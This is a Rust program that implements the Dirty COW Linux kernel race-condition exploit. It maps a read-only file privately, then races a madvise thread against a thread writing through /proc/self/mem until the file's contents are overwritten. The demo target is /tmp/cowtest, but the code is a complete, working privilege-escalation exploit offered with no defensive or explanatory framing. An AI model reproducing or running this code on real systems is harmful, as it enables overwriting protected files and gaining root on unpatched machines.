use std::fs::OpenOptions;
use std::io::{Read, Seek, SeekFrom, Write};
use std::os::unix::io::AsRawFd;
use std::ptr;
use std::sync::{
    atomic::{AtomicBool, Ordering},
    Arc,
};
use std::thread;
use std::time::{Duration, Instant};

fn main() -> std::io::Result<()> {
    let target_path = "/tmp/cowtest";
    let new_content = "after--after--after-\n";

    let file = OpenOptions::new()
        .read(true)
        .open(target_path)?;

    let map = unsafe {
        libc::mmap(
            ptr::null_mut(),
            new_content.len(),
            libc::PROT_READ,
            libc::MAP_PRIVATE,
            file.as_raw_fd(),
            0,
        )
    };

    if map == libc::MAP_FAILED {
        return Err(std::io::Error::last_os_error());
    }

    println!("Mapping established at {:p}", map);

    let running = Arc::new(AtomicBool::new(true));

    let map_usize = map as usize;
    let len = new_content.len();

    let running_madvise = running.clone();
    let madvise_thread = thread::spawn(move || {
        let map_ptr = map_usize as *mut libc::c_void;

        while running_madvise.load(Ordering::Relaxed) {
            unsafe {
                libc::madvise(map_ptr, len, libc::MADV_DONTNEED);
            }
        }
    });

    let running_write = running.clone();
    let write_thread = thread::spawn(move || {
        let mut mem_file = OpenOptions::new()
            .read(true)
            .write(true)
            .open("/proc/self/mem")
            .expect("Failed to open /proc/self/mem");

        let buf = new_content.as_bytes();

        while running_write.load(Ordering::Relaxed) {
            mem_file.seek(SeekFrom::Start(map_usize as u64)).unwrap();
            let _ = mem_file.write_all(buf);
        }
    });

    println!("Threads started. Running exploit for 10 seconds...");

    let start = Instant::now();

    while start.elapsed() < Duration::from_secs(10) {
        let mut contents = String::new();

        if OpenOptions::new()
            .read(true)
            .open(target_path)?
            .read_to_string(&mut contents)
            .is_ok()
        {
            if contents.contains("after--after--after-") {
                println!("Success: target file changed.");
                break;
            }
        }

        thread::sleep(Duration::from_millis(100));
    }

    running.store(false, Ordering::Relaxed);

    madvise_thread.join().unwrap();
    write_thread.join().unwrap();

    unsafe {
        libc::munmap(map, len);
    }

    println!("Final target contents:");
    println!("{}", std::fs::read_to_string(target_path)?);

    Ok(())
}